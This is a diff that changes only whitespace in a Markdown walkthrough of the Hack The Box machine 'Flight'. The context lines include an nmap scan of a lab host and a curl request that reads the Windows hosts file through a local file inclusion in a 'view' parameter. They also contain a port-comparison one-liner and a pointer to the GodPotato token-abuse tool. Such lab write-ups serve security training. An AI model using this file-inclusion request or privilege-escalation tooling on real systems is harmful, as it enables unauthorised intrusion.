@@ -32,7 +32,6 @@ Flight is a hard Windows machine that starts with a website with two different v
 ## Nmap
 
 ```bash
-
 # Nmap 7.94SVN scan initiated Sat Dec 23 03:34:22 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49690,49697 10.129.228.120
 Nmap scan report for 10.129.228.120
 Host is up, received user-set (0.45s latency).
@@ -85,7 +84,6 @@ Host script results:
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Sat Dec 23 03:36:13 2023 -- 1 IP address (1 host up) scanned in 110.95 seconds
 ```
 
@@ -287,46 +285,26 @@ Finished
 ┌──(bravosec㉿fsociety)-[~/htb/Flight]
 └─$ curl 'http://school.flight.htb/index.php?view=/windows/system32/drivers/etc/hosts'
 [...]
-
 # Copyright (c) 1993-2009 Microsoft Corp.
-
 #
-
 # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
-
 #
-
 # This file contains the mappings of IP addresses to host names. Each
-
 # entry should be kept on an individual line. The IP address should
-
 # be placed in the first column followed by the corresponding host name.
-
 # The IP address and the host name should be separated by at least one
-
 # space.
-
 #
-
 # Additionally, comments (such as these) may be inserted on individual
-
 # lines or following the machine name denoted by a '#' symbol.
-
 #
-
 # For example:
-
 #
-
 #      102.54.94.97     rhino.acme.com          # source server
-
 #       38.25.63.10     x.acme.com              # x client host
 
-
 # localhost name resolution is handled within DNS itself.
-
 #       127.0.0.1       localhost
-
 #       ::1             localhost
 [...]
 ```
@@ -988,6 +966,7 @@ PS C:\xampp\htdocs\school.flight.htb> netstat -ano -p tcp | sls listen
 
 > **A quick way to check ports that are not accessible from outside the machine**
 > 
+> 
 > ```bash
 > cat nmap/all_tcp_ports.nmap | tail -n +2 | grep -i open | awk '{print $1}' | cut -d'/' -f1 | tr '\n' ' ' > n
 > cat loot/netstat.txt | awk '$2 ~ /0.0.0.0/' | awk -F: '{print $2}' | awk '{print $1}' | xargs > h
@@ -1233,6 +1212,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 ### Abuse privilege tokens
 
 > **Godpotato works too**
+> 
 > > https://github.com/BeichenDream/GodPotato
 > 
 > **Godpotato** was designed to work for newer versions of windows (`Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11`)
